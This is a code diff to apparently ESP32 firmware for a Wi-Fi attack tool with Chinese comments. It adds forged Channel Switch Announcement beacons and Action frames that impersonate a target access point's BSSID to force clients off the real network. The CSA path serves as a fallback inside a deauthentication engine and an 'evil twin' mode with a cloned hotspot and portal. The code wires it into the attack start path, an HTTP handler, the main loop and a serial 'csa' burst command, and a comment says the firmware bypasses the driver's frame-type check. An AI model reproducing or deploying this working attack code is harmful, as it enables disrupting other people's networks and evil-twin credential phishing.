@@ -355,9 +355,17 @@ struct DeauthEngine {
   int32_t lastTxErr = 0;   // 最近一次 esp_wifi_80211_tx 返回码 (0=ESP_OK)
   bool channelMoved = false;  // 攻击期间已临时把热点切到目标信道 (停止时恢复)
   uint8_t restoreChannel = 0; // 停止时应恢复的配置信道
-  // 平台限制 (C5 真机实测): WiFi 库对白名单外帧 (Deauth/Disassoc) 的 80211_tx 返回 258,
-  // 偶发放行不可复现 (精确复刻成功序列仍失败) → 远程注入不可用, 启动时单帧试探标记。
+  // 平台限制: 驱动在 esp_wifi_80211_tx 前做帧类型校验 (ieee80211_raw_frame_sanity_check),
+  // 拒绝 Deauth(0xC0)/Disassoc(0xA0) 并返回 258。本固件已覆盖该函数解除白名单, 真 Deauth 可用;
+  // 下面两个标志仅作兜底: 若某构建仍被拒, 自动改用伪造 CSA 让客户端跟随切信道掉线。
   bool platformBlocked = false;
+  bool csaMode = false;        // true = 用 CSA 信标/Action 替代被拒的 Deauth 帧
+  uint8_t csaBeacon[96];       // 伪造 CSA 信标 (BSSID 冒用目标 AP)
+  uint16_t csaBeaconLen = 0;
+  uint8_t csaAction[48];       // 伪造 Spectrum Management CSA Action 帧
+  uint8_t csaActionLen = 0;
+  uint32_t csaCount = 0;
+  uint8_t csaNewChannel = 1;   // 让客户端切去的假信道
 };
 static DeauthEngine sDeauth;
 
@@ -538,6 +546,72 @@ static uint16_t buildBeaconFrame(const String &ssidIn, const String &bssidIn, ui
     f[i++] = 0x03; f[i++] = 0x01; f[i++] = channel;
   }
   return i;
+}
+
+// ---- CSA (Channel Switch Announcement) 强制下线 (Deauth 被驱动拒绝时的兜底) ----
+// 用冒充目标 AP BSSID 的 CSA 帧让客户端"跟随 AP 切换信道"从而脱离真实网络。
+// 注意: Privacy 位已置却缺 RSN IE 的信标会被 Wi-Fi 6 客户端丢弃, 因此该兜底只对宽松客户端有效。
+static uint16_t buildCsaBeaconFrame(const String &ssidIn, const String &bssidIn,
+                                   uint8_t curCh, uint8_t newCh, uint8_t *f) {
+  uint8_t mac[6];
+  String bssid = bssidIn;
+  bssid.trim();
+  if (!parseBssid(bssid, mac)) return 0;
+  String ssid = ssidIn;
+  if (ssid.length() > 32) ssid = ssid.substring(0, 32);
+  static const uint8_t BROADCAST[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
+  static const uint8_t RATES[8] = {0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24};
+  uint16_t i = 0;
+  f[i++] = 0x80; f[i++] = 0x00;              // Beacon
+  f[i++] = 0x00; f[i++] = 0x00;
+  memcpy(f + i, BROADCAST, 6); i += 6;
+  memcpy(f + i, mac, 6); i += 6;             // 冒用目标 AP
+  memcpy(f + i, mac, 6); i += 6;
+  f[i++] = 0x00; f[i++] = 0x00;
+  for (int k = 0; k < 8; k++) f[i++] = 0x00; // Timestamp
+  f[i++] = 0x64; f[i++] = 0x00;              // Beacon Interval
+  f[i++] = 0x31; f[i++] = 0x04;              // Capability: ESS+Privacy+ShortSlot (像 WPA2 AP)
+  f[i++] = 0x00; f[i++] = (uint8_t)ssid.length();
+  for (size_t k = 0; k < ssid.length(); k++) f[i++] = (uint8_t)ssid[k];
+  f[i++] = 0x01; f[i++] = 0x08;              // Supported Rates
+  for (int k = 0; k < 8; k++) f[i++] = RATES[k];
+  if (!isBand5G(curCh)) { f[i++] = 0x03; f[i++] = 0x01; f[i++] = curCh; }  // DS: 当前信道
+  f[i++] = 0x25; f[i++] = 0x03;              // CSA IE (37): mode=1, newCh, count=1
+  f[i++] = 0x01; f[i++] = newCh; f[i++] = 0x01;
+  return i;
+}
+
+// Spectrum Management CSA Action 帧 (Category 0 / Action 4) —— 部分客户端只认 Action 形式
+static uint8_t buildCsaActionFrame(const String &bssidIn, uint8_t newCh, uint8_t *f) {
+  uint8_t mac[6];
+  String bssid = bssidIn;
+  bssid.trim();
+  if (!parseBssid(bssid, mac)) return 0;
+  static const uint8_t BROADCAST[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
+  uint8_t i = 0;
+  f[i++] = 0xD0; f[i++] = 0x00;              // Action
+  f[i++] = 0x00; f[i++] = 0x00;
+  memcpy(f + i, BROADCAST, 6); i += 6;
+  memcpy(f + i, mac, 6); i += 6;
+  memcpy(f + i, mac, 6); i += 6;
+  f[i++] = 0x00; f[i++] = 0x00;
+  f[i++] = 0x00;                             // Category: Spectrum Management
+  f[i++] = 0x04;                             // Action: Channel Switch Announcement
+  f[i++] = 0x25; f[i++] = 0x03; f[i++] = 0x01; f[i++] = newCh; f[i++] = 0x01;
+  return i;
+}
+
+// 为目标 AP 预构 CSA 帧; 2.4G 目标挑一个远端信道 (<=6→13, 否则→1), 5G 同理。
+static bool csaPrepare(const String &ssid, const String &bssid, uint8_t curCh) {
+  if (ssid.length() == 0 || curCh == 0) return false;
+  uint8_t newCh;
+  if (isBand5G(curCh)) newCh = (curCh <= 48) ? 165 : 36;
+  else newCh = (curCh <= 6) ? 13 : 1;
+  if (newCh == curCh) newCh = (curCh == 1) ? 13 : 1;
+  sDeauth.csaNewChannel = newCh;
+  sDeauth.csaBeaconLen = buildCsaBeaconFrame(ssid, bssid, curCh, newCh, sDeauth.csaBeacon);
+  sDeauth.csaActionLen = buildCsaActionFrame(bssid, newCh, sDeauth.csaAction);
+  return sDeauth.csaBeaconLen > 0;
 }
 
 // 临时切换 AP 空口信道到 ch (不修改 NVS 配置); 成功返回 true。ch 支持 2.4G(1-14) 与 5G(32-177, 仅双频芯片)。
@@ -2126,8 +2200,26 @@ static bool eviltwinStartAttack(String &err) {
   sDeauth.channelMoved   = false;
   sDeauth.restoreChannel = apChannel;
   sDeauth.txOk = false; sDeauth.lastTxErr = 0;
-  sDeauth.running = sDeauth.frameReady && !sDeauth.platformBlocked;   // C5 平台受限时不注入 (克隆热点与门户仍工作)
-  sDeauth.frameCount = 0; sDeauth.lastTxTime = millis(); sDeauth.lastLogTime = millis();
+  sDeauth.csaMode = false; sDeauth.csaCount = 0; sDeauth.frameCount = 0;
+  // 先探测真 Deauth 是否可用 (白名单已覆盖, 正常为可用); 若仍被拒则切 CSA 强制下线
+  csaPrepare(sTarget.ssid, sTarget.bssid, (uint8_t)sTarget.channel);
+  esp_err_t probe = ESP_FAIL;
+  if (sDeauth.frameReady) probe = wifi80211Tx(WIFI_IF_AP, sDeauth.frame, (int)sizeof(sDeauth.frame), true);
+  if (probe == ESP_OK) {
+    sDeauth.platformBlocked = false;
+    sDeauth.running = true;
+  } else {
+    sDeauth.platformBlocked = true;
+    sDeauth.csaMode = (sDeauth.csaBeaconLen > 0 && sDeauth.frameReady);
+    sDeauth.running = sDeauth.csaMode;
+    if (sDeauth.csaMode) {
+      log("[deauth] 驱动拒绝 Deauth 帧 (err=" + String((int)probe) + ") → 改用 CSA 信道切换强制下线 (切至 ch" +
+          String(sDeauth.csaNewChannel) + ", WPA2 有效 / WPA3 PMF 无效)");
+    } else {
+      log("[deauth] Deauth 被驱动拒绝且 CSA 构造失败 (SSID/BSSID 缺失)");
+    }
+  }
+  sDeauth.lastTxTime = millis(); sDeauth.lastLogTime = millis();
   sEvilTwin.deauthAuto = sDeauth.running;
 
   // 3) 双子目标列表: 至少一条可用则启用轮询跳频注入 (含「假 AP」信标广播)
@@ -2742,38 +2834,45 @@ static void handleDeauthStart() {
   const bool channelMismatch = (sDeauth.frameReady && sDeauth.targetChannel != apChannelActive);
   sDeauth.running = true;
   sDeauth.frameCount = 0;
+  sDeauth.csaMode = false; sDeauth.csaCount = 0;
   sDeauth.lastTxTime = millis();
-  syncPromiscuousEngine();   // Deauth 帧注入需要 promiscuous 开启 (C5 库白名单约束)
-  // 平台能力试探: 单帧真实发送。C5 WiFi 库拒绝白名单外帧 (258) → 如实报告, 不空转
+  syncPromiscuousEngine();
+  csaPrepare(sTarget.ssid.length() ? sTarget.ssid : sDeauth.targetBssid,
+             sDeauth.targetBssid, (uint8_t)sDeauth.targetChannel);
+  // 平台能力试探: 若驱动仍拒绝 Deauth(0xC0) → 自动降级为 CSA 强制下线 (兜底)
   if (sDeauth.frameReady) {
     const esp_err_t probe = wifi80211Tx(WIFI_IF_AP, sDeauth.frame, (int)sizeof(sDeauth.frame), true);
     sDeauth.platformBlocked = (probe != ESP_OK);
     sDeauth.txOk = (probe == ESP_OK);
     sDeauth.lastTxErr = probe;
     if (sDeauth.txOk) sDeauth.frameCount = 1;
-    if (sDeauth.platformBlocked) {
+    else if (sDeauth.csaBeaconLen > 0) {
+      sDeauth.csaMode = true;
+      log("[deauth] 驱动拒绝 Deauth 帧 (err=" + String((int)probe) + ") → 降级 CSA 强制下线 (切至 ch" +
+          String(sDeauth.csaNewChannel) + ", WPA2 有效 / WPA3 PMF 无效)");
+    } else {
       sDeauth.running = false;
       syncPromiscuousEngine();
       emitLabState("deauth", false);
-      log("[deauth] 平台限制: 本芯片 WiFi 库拒绝 Deauth 帧注入 (错误码 " + String(probe) +
-          ", 帧类型白名单), 远程压制不可用");
-      log("[deauth] 可用替代: esp_wifi_deauth_sta() 可真实断开本机 AP 的关联客户端 (真机验证有效)");
+      log("[deauth] 平台限制: Deauth 被驱动拒绝且 CSA 无法构造 (缺目标 SSID/BSSID)");
       server.sendHeader("Access-Control-Allow-Origin", "*");
       server.send(200, "application/json",
-                  "{\"ok\":false,\"running\":false,\"injected\":false,\"platformBlocked\":true," +
-                  String("\"error\":\"本芯片 WiFi 库拒绝 Deauth 帧类型注入 (远程压制不可用), 可用本机 AP 客户端断开替代\"}") +
-                  "");
+                  "{\"ok\":false,\"running\":false,\"injected\":false,\"platformBlocked\":true,"
+                  "\"error\":\"本芯片拒绝 Deauth 帧注入, 且缺少目标 SSID 无法改用 CSA\"}");
       return;
     }
   }
   emitLabState("deauth", true);
-  log("[deauth] 取消认证器已启动! " + String(sDeauth.frameReady ? "真实帧注入" : "目标 BSSID 无效, 无法注入") +
+  log("[deauth] 取消认证器已启动! " +
+      String(sDeauth.csaMode ? ("CSA 信道切换强制下线 (切至 ch" + String(sDeauth.csaNewChannel) + ")")
+                             : (sDeauth.frameReady ? "真实 Deauth 帧注入" : "目标 BSSID 无效, 无法注入")) +
       " 目标=" + sDeauth.targetBssid + " ch=" + String(sDeauth.targetChannel) + " 原因码=" + String(sDeauth.reasonCode) +
       (channelAligned ? " (已对齐目标: AP 信道切至 ch" + String(apChannelActive) + ", 已连设备将短暂掉线)" : "") +
       (channelMismatch ? " (信道对齐失败: 帧仍只能在 ch" + String(apChannelActive) + " 发出, 目标收不到)" : ""));
   server.sendHeader("Access-Control-Allow-Origin", "*");
   server.send(200, "application/json",
               "{\"ok\":true,\"running\":true,\"injected\":" + String(sDeauth.frameReady ? "true" : "false") +
+              ",\"csa\":" + String(sDeauth.csaMode ? "true" : "false") +
               ",\"txChannel\":" + String(apChannelActive) +
               ",\"channelAligned\":" + String(channelAligned ? "true" : "false") +
               ",\"channelMismatch\":" + String(channelMismatch ? "true" : "false") + "}");
@@ -4014,6 +4113,27 @@ static void cli80211TxTest() {
   syncPromiscuousEngine();
 }
 
+// 诊断: CSA 强制下线实测 (串口 csa)。对当前主目标连发 15s CSA 信标+Action, 打印成功计数。
+static void cliCsaTest() {
+  if (!sTarget.set || sTarget.ssid.length() == 0 || sTarget.bssid.length() == 0) {
+    Serial.println("[csa] 无主目标: 请先在后台设置目标 AP (SSID+BSSID+信道)");
+    return;
+  }
+  applyApChannel((uint8_t)sTarget.channel);
+  csaPrepare(sTarget.ssid, sTarget.bssid, (uint8_t)sTarget.channel);
+  Serial.printf("[csa] 目标=%s bssid=%s ch=%d → 通知客户端切到 ch%d, 连发 15s\n",
+                sTarget.ssid.c_str(), sTarget.bssid.c_str(), (int)sTarget.channel,
+                (int)sDeauth.csaNewChannel);
+  int okB = 0, okA = 0, okBLast = -1;
+  for (int i = 0; i < 300; i++) {          // 20 fps * 15s
+    okBLast = (int)wifi80211Tx(WIFI_IF_AP, sDeauth.csaBeacon, sDeauth.csaBeaconLen, true);
+    if (okBLast == 0) okB++;
+    if (sDeauth.csaActionLen && wifi80211Tx(WIFI_IF_AP, sDeauth.csaAction, sDeauth.csaActionLen, true) == 0) okA++;
+    delay(50);
+  }
+  Serial.printf("[csa] 完成: beacon ok=%d action ok=%d / 300 (beacon 末次返回=%d)\n", okB, okA, okBLast);
+}
+
 static void handleSerialCli() {
   while (Serial.available()) {
     char c = (char)Serial.read();
@@ -4033,6 +4153,8 @@ static void handleSerialCli() {
           Serial.println(F("pass               : 查看当前后台管理口令 (或输入 pass <新口令> 修改)"));
           Serial.println(F("wifi               : 重启 WiFi 射频 (修复 802.15.4 后 AP 收不到包)"));
           Serial.println(F("deauth             : 立即停止 Deauth 帧注入 (被误踢后串口自救)"));
+          Serial.println(F("txtest             : 802.11 raw 发送变体矩阵 (诊断帧类型白名单)"));
+          Serial.println(F("csa                : 对当前目标连发 15s CSA 强制下线帧 (实测挤下线)"));
           Serial.println(F("====================\n"));
         } else if (cmd == "boot" || cmd == "boot status") {
           Serial.println(F("\n=== 多系统引导槽位 (Triple-Boot) ==="));
@@ -4071,6 +4193,8 @@ static void handleSerialCli() {
           stopDeauthEngine();
         } else if (cmd == "txtest") {
           cli80211TxTest();
+        } else if (cmd == "csa") {
+          cliCsaTest();
         } else if (cmd == "info") {
           Serial.printf("[system] 芯片:%s FreeHeap:%d Uptime:%lus SSID:%s\n",
                         detectChipKey().c_str(), ESP.getFreeHeap(), millis() / 1000, apSsid.c_str());
@@ -4511,7 +4635,16 @@ void loop() {
   if (sDeauth.running && !(sEvilTwin.active && sEvilTwin.hopping)) {
     if (now - sDeauth.lastTxTime >= sDeauth.rateLimitMs) {
       sDeauth.lastTxTime = now;
-      if (sDeauth.frameReady) {
+      if (sDeauth.csaMode) {
+        // CSA 强制下线: 广播伪造 CSA 信标 + Action 帧, 让目标客户端跟随切信道脱离真实 AP
+        bool ok = false;
+        if (sDeauth.csaBeaconLen &&
+            wifi80211Tx(WIFI_IF_AP, sDeauth.csaBeacon, (int)sDeauth.csaBeaconLen, true) == ESP_OK) ok = true;
+        if (sDeauth.csaActionLen)
+          wifi80211Tx(WIFI_IF_AP, sDeauth.csaAction, (int)sDeauth.csaActionLen, true);
+        sDeauth.txOk = ok;
+        if (ok) { sDeauth.csaCount++; sDeauth.frameCount++; }
+      } else if (sDeauth.frameReady) {
         sDeauth.lastTxErr = wifi80211Tx(WIFI_IF_AP, sDeauth.frame, (int)sizeof(sDeauth.frame), true);
         sDeauth.txOk = (sDeauth.lastTxErr == ESP_OK);
         if (sDeauth.txOk) sDeauth.frameCount++;
